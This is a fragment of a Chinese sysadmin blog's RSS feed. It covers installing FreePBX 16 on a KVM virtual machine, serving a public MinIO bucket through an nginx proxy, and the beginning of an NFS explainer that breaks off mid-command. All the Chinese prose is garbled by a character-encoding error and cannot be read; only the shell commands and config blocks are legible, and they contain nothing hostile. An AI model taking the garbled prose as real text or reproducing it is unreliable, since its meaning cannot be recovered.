&lt;p&gt;è¿™ä¸ªæ›´æ˜¯æ•‘å‘½äº†ï¼Œè¯è¯´ç¬¬äºŒå›åœ¨å¡ç­çš„æ—¶å€™æ­£æ˜¯ç–«æƒ…åˆšå‘ä½œçš„æ—¶å€™ï¼Œå¡ç­ç›´æ¥å°å²›äº†ï¼Œç„¶åå¥½å¤šèˆªç­éƒ½å»¶æœŸæˆ–ç»ˆæ­¢äº†ï¼Œå°±æ˜¯ç”¨è¿™ä¸ªæ—…é¡ºæ‰“å›½å†…ç”µè¯æ”¹ç­¾äº†å›å›½çš„æœºç¥¨ï¼Œè¶³è¶³æ‰“äº†ä¸¤ä¸ªå°æ—¶å•Šï¼Œåˆ°å¤„å çº¿ç­‰å¾…ï¼Œå¦‚æœæ‰“å›½é™…é•¿é€”çš„è¯è´¹ç”¨ä¸å ªè®¾æƒ³ï¼Œå¦å¤–æ‰“å¡ç­å¤§éŸ©èˆªç©ºçš„ç”µè¯æ”¹ç­¾ä¸¤ç¨‹æœºç¥¨ä¹Ÿæ˜¯ä¸å¯æƒ³åƒçš„ï¼Œæ‰€ä»¥ï¼Œå…³é”®æ—¶åˆ»æ˜¯çœŸçš„æ•‘å‘½å•Šã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¹ˆå¥½çš„è½¯ä»¶å´ç›´æ¥å€’é—­æ¶ˆå¤±äº†ï¼ŒçœŸæ˜¯ä¸‡åˆ†å¯æƒœå•Šã€‚&lt;/p&gt;
&lt;p&gt;å“ï¼Œç°åœ¨æ²¡æœ‰è¿™ä¸ªäº†ï¼Œåªèƒ½è‡ªå·±æ­ä¸€ä¸ªvoipç”µè¯è‡ªç”¨äº†ã€‚&lt;/p&gt;
&lt;p&gt;åˆšå¼€å§‹æ˜¯è€ƒè™‘RasPBXï¼Œå…¶å®è‡ªå·±ç”¨æ ‘è“æ´¾æ­è¿‡ï¼Œè´¹äº‹ä¸è¯´ï¼Œä¸»è¦æ ‘è“æ´¾å®¹æ˜“æ­»æœºï¼ŒåŠ¡å¿…è¦ç¨³å®šï¼Œæ‰€ä»¥å¹²è„†ç”¨FreePBXæ­å»ºåœ¨kvmæœåŠ¡å™¨è™šæ‹Ÿæœºä¸Šçš„æ–¹å¼ï¼Œæ¥ä¿æŒç»å¯¹ç¨³å®šã€‚&lt;/p&gt;
&lt;p&gt;ä»¥ä¸‹æ•™ç¨‹åªé€‚ç”¨äº FreePBX 16 çš„å®˜æ–¹ISOï¼Œå…·ä½“åšæ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€å®‰è£…kvmè™šæœº&#34;&gt;ä¸€ã€å®‰è£…KVMè™šæœºï¼š&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#ä¸‹è½½FreePBX16çš„isoå…‰ç›˜&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://downloads.freepbxdistro.org/ISO/SNG7-PBX16-64bit-2302-1.iso
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#åˆ›å»ºqcow2è™šæœºæ–‡ä»¶&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;qemu-img create -f qcow2 freepbx-8-2-60/freepbx-8-2-60.qcow2 20G
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virt-install &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--name&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;freepbx-8-2-60 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--vcpu&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--ram&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;8096&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--disk &lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/export/kvm/freepbx-8-2-60/freepbs-8-2-60.qcow2,format&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;qcow2,size&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--cdrom&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/export/kvm/SNG7-PBX16-64bit-2302-1.iso &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--network &lt;span class=&#34;nv&#34;&gt;bridge&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;br0 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--os-type&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;linux &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--vnc --vnclisten&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0.0.0.0 --vncport&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;5916&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç”¨vncè¿æ¥5916ç«¯å£å®‰è£…ï¼Œè®¾ç½®ä¸€ä¸‹rootçš„å¯†ç å®‰è£…ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ ·å®‰è£…å¥½åï¼Œç³»ç»Ÿå…¶å®æ˜¯dhcpåŠ¨æ€è·å¾—ipçš„ï¼Œè¿›å…¥çœ‹äº†çœ‹ï¼Œæ˜¯Centosï¼Œæˆ‘ä»¬ä¸éœ€è¦dhcpï¼ŒæŠŠIPç»™å›ºå®šæ­»&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/sysconfig/network-scripts/ifcfg-eth0 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;TYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Ethernet&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;BOOTPROTO&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;static&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;IPADDR&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10.8.2.60
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;NETMASK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;255.255.255.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;GATEWAY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10.8.2.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;DNS1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;114.114.114.114
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;DEFROUTE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;yes&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;NAME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;eth0&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;DEVICE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;eth0&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ONBOOT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;yes&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;SSHç™»å½•ä¸€ä¸‹æ²¡é—®é¢˜ï¼Œçœ‹åˆ°ç»¿æ¡†å°±okäº†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240105141241964&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240105-voip_iphone/image-20240105141241964.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;äºŒé…ç½®freepbxçš„åˆ†æœº&#34;&gt;äºŒã€é…ç½®FreePBXçš„åˆ†æœº&lt;/h2&gt;
&lt;p&gt;æ‰“å¼€ç½‘å€ http://10.8.2.60 , ç™»å½• FreePBX Administration&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240105144025926&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240105-voip_iphone/image-20240105144025926.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç™»ä¸Šå»åæ˜¯è¿™ä¸ªæ ·å­&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240105144212316&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240105-voip_iphone/image-20240105144212316.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šé¢æˆ‘æ²¡æœ‰å¼€System Firewallï¼Œè¿™ä¸ªçœ‹ä¸ªäººéœ€æ±‚ï¼Œç»å¯¹ä¸è¦åƒå…¬ç½‘å¼€æ”¾80ç«¯å£ï¼Œåªå¼€5060çš„udpå’Œ1000-10004çš„UDPã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>é…ç½®Minio&#43;nginxçš„ä»£ç†æ¥å¼€æ”¾æ¡¶å†…å†…å®¹</title>
      <link>https://rendoumi.com/posts/20231228-minio_nginx/</link>
      <pubDate>Thu, 28 Dec 2023 13:35:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231228-minio_nginx/</guid>
      <description>&lt;p&gt;åŒäº‹æœ‰ä¸ªéœ€æ±‚ï¼Œæƒ³å¼€æ”¾ä¸ªåŸŸåï¼Œç»™åˆ«çš„åŒäº‹ä»¬ä¸‹è½½æ–‡ä»¶ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªå…¶å®å¾ˆå»ºå•ï¼Œé—®é¢˜å°±æ˜¯æ–‡ä»¶æ€ä¹ˆæ”¾ä¸Šå»ï¼Œsftpã€ftpä»€ä¹ˆçš„éƒ½éœ€è¦æ­ä¸ªæœåŠ¡å™¨ï¼Œå…¶å®æœ€ç®€å•åº”è¯¥æ˜¯webdavï¼Œä½†æ˜¯æ”¾å…¬ç½‘åˆä¸å¤ªå®‰å…¨ã€‚&lt;/p&gt;
&lt;p&gt;æœ¬æ¥è€ƒè™‘æ˜¯ç”¨ oss çš„æ¡¶ï¼Œå‰é¢ç›´æ¥å¥—ä¸ªCDNï¼Œä½†æ˜¯å¦‚æœæ¡¶æ–‡ä»¶æ³„éœ²è¢«ç–¯ç‹‚ä¸‹è½½ï¼Œä¹Ÿä¼šä»˜å‡ºé“¶ä¸¤ã€‚&lt;/p&gt;
&lt;p&gt;æœ€ååšæ³•æ˜¯ç”¨ Minio å¼„ä¸€ä¸ªæ¨¡æ‹Ÿçš„æ¡¶ç¯å¢ƒï¼Œå‰é¢é…ç½®ä¸Š Nginxï¼Œå¸¦å®½é™åˆ¶åˆ°1Mï¼Œè¿™æ ·å°±æ— æ‰€è°“äº†ã€‚åŒäº‹ç”¨å¦ä¸€å°æœºå™¨æ¨¡æ‹ŸS3çš„APIå¾€ä¸Šé¢æ”¾æ–‡ä»¶ä¾›ä¸‹è½½ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€ã€minioçš„å®‰è£…&lt;/p&gt;
&lt;p&gt;ä¸‹è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç®€å•ç²—æš´å¯åŠ¨ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;nohup /app/minio/minio server --address &lt;span class=&#34;s1&#34;&gt;&amp;#39;0.0.0.0:9000&amp;#39;&lt;/span&gt; --console-address &lt;span class=&#34;s1&#34;&gt;&amp;#39;0.0.0.0:9001&amp;#39;&lt;/span&gt; /app/bucket &amp;gt; /app/minio/minio.log 2&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·å°±å¯åŠ¨äº†ï¼Œç„¶åç½‘é¡µæ‰“å¼€ http://10.10.247.211:9000 ï¼Œå°±å¯ä»¥çœ‹åˆ°ç™»å½•ç•Œé¢äº†&lt;/p&gt;
&lt;p&gt;ç™»å½•åï¼Œæˆ‘ä»¬å…ˆå»ºç«‹ä¸€ä¸ªBucketï¼Œå°±å«åšpubæ¡¶ï¼ŒæŠŠpubæ¡¶çš„ç­–ç•¥æ”¹æˆpublicï¼Œè¿™æ ·nginxä»£ç†çš„æ—¶å€™æ‰èƒ½ç›´æ¥è®¿é—®åˆ°&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20231228140755759&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231228-minio_nginx/image-20231228140755759.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæˆ‘ä»¬ä¸Šä¼ ä¸ªå›¾ç‰‡ï¼ŒBOMS3.0.pngï¼Œç„¶åå»/app/bucketç›®å½•ä¸‹çœ‹çœ‹&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20231228141032738&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231228-minio_nginx/image-20231228141032738.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç»“æœå‘ç°BOMS3.0.pngå±…ç„¶æ˜¯ä¸ªç›®å½•ï¼Œè¿›å»ç»§ç»­çœ‹&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20231228141121489&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231228-minio_nginx/image-20231228141121489.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;metaä¿¡æ¯å’Œè‹¥å¹²çš„partï¼Œçœ‹æ¥è¿™æ˜¯ä¸ºå¤šç‰ˆæœ¬å‡†å¤‡çš„ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¦ç­–ç•¥æ˜¯publicçš„åŸå› ï¼Œä¸æ˜¯å°±æ— æ³•ä»9000è®¿é—®ã€‚&lt;/p&gt;
&lt;p&gt;äºŒã€å®‰è£…é…ç½®nginx&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;server &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    listen      80&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    listen      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:80&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    server_name  supervisor-task.ddky.com&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    location / &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; https://supervisor-task.ddky.com&lt;span class=&#34;nv&#34;&gt;$request_uri&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;server &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    listen       &lt;span class=&#34;m&#34;&gt;443&lt;/span&gt; ssl&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    server_name  supervisor_task.ddky.com&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ssl_certificate      /etc/nginx/cert/_.ddky.com.crt&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ssl_certificate_key  /etc/nginx/cert/_.ddky.com.key&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ssl_session_timeout 5m&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    location / &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        rewrite ^/$ /pub/index.html break&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        proxy_pass http://10.10.247.211:9000/pub/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        proxy_redirect off&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    access_log     /app/logs/access.log &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    error_log      /app/logs/error.log&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸»è¦å°±æ˜¯è¦é…ç½®ä»£ç†ï¼Œä»£ç†åˆ°minioçš„9000ç«¯å£&lt;/p&gt;</description>
    </item>
    <item>
      <title>NFSçš„è¯¦ç»†è§£é‡Š</title>
      <link>https://rendoumi.com/posts/20231228-nfs_detail/</link>
      <pubDate>Thu, 28 Dec 2023 09:10:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231228-nfs_detail/</guid>
      <description>&lt;h2 id=&#34;nfsçš„serveråˆ†ä¸¤éƒ¨åˆ†&#34;&gt;NFSçš„SERVERåˆ†ä¸¤éƒ¨åˆ†ï¼š&lt;/h2&gt;
&lt;h3 id=&#34;1rpc-ä¸»ç¨‹åºrpcbind&#34;&gt;1ã€RPC ä¸»ç¨‹åºï¼šrpcbind&lt;/h3&gt;
&lt;p&gt;NFS æœ¬è´¨æ˜¯ä¸€ä¸ª RPC æœåŠ¡ï¼Œè€Œè¦å¯åŠ¨ä»»ä½•ä¸€ä¸ª RPC æœåŠ¡ä¹‹å‰ï¼Œéƒ½éœ€è¦åšå¥½ port çš„å¯¹åº” (mapping) çš„å·¥ä½œæ‰è¡Œï¼Œè¿™ä¸ªå·¥ä½œå…¶å®å°±æ˜¯ã€ rpcbind ã€è¿™ä¸ªæœåŠ¡æ‰€è´Ÿè´£çš„ï¼ä¹Ÿå°±æ˜¯è¯´ï¼Œ åœ¨å¯åŠ¨ä»»ä½•ä¸€ä¸ª RPC æœåŠ¡ä¹‹å‰ï¼Œæˆ‘ä»¬éƒ½éœ€è¦å¯åŠ¨ rpcbind æ‰è¡Œï¼ (åœ¨ CentOS 5.x ä»¥å‰è¿™ä¸ªè½¯ä»¶ç§°ä¸º portmapï¼Œåœ¨ CentOS 6.x ä¹‹åæ‰ç§°ä¸º rpcbind çš„ï¼)&lt;/p&gt;
&lt;h3 id=&#34;2nfs-ä¸»ç¨‹åºnfs-utils&#34;&gt;2ã€NFS ä¸»ç¨‹åºï¼šnfs-utils&lt;/h3&gt;
&lt;p&gt;å°±æ˜¯æä¾› rpc.nfsd åŠ rpc.mountd è¿™ä¸¤ä¸ª NFS daemons ä¸å…¶ä»–ç›¸å…³ documents ä¸è¯´æ˜æ–‡ä»¶ã€æ‰§è¡Œæ–‡ä»¶ç­‰çš„è½¯ä»¶ï¼è¿™ä¸ªå°±æ˜¯ NFS æœåŠ¡æ‰€éœ€è¦çš„ä¸»è¦è½¯ä»¶ï¼&lt;/p&gt;
&lt;h2 id=&#34;å®‰è£…æœåŠ¡ç«¯nfs-server&#34;&gt;å®‰è£…æœåŠ¡ç«¯NFS Server&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install nfs-utils rpcbind  -y
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install nfs-kernel-server
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;å®¢æˆ·ç«¯ä¸æä¾›æœåŠ¡æ‰€ä»¥ä¸ç”¨è£…rpcbind&#34;&gt;å®¢æˆ·ç«¯ä¸æä¾›æœåŠ¡ï¼Œæ‰€ä»¥ä¸ç”¨è£…rpcbind&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install nfs-utils
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install nfs-common
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;å°†nfså’ŒrpcbindåŠ å…¥å¼€æœºå¯åŠ¨&#34;&gt;å°†NFSå’ŒrpcbindåŠ å…¥å¼€æœºå¯åŠ¨&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; --now rpcbind
